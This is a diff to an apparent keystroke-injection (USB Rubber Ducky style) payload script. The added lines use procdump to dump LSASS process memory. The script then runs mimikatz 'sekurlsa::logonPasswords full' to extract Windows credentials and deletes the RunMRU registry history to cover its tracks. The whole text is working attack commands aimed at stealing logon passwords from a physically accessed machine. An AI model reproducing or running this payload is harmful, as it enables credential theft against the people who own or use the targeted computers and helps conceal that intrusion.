@@ -20,13 +20,15 @@ ENTER
 REM Invoke Mimikatz with lsass.dmp and save the results
 STRING D:
 ENTER
+STRING procdump.exe -accepteula -ma lsass.exe lsass.dmp
+ENTER
+DELAY 20000
 STRING mimikatz # sekurlsa::minidump lsass.dmp
 ENTER
 DELAY 1000
 STRING mimikatz # sekurlsa::logonPasswords full
-DELAY
 ENTER
-DELAY 15000
+DELAY 20000
 REM Clear the Run history
 STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
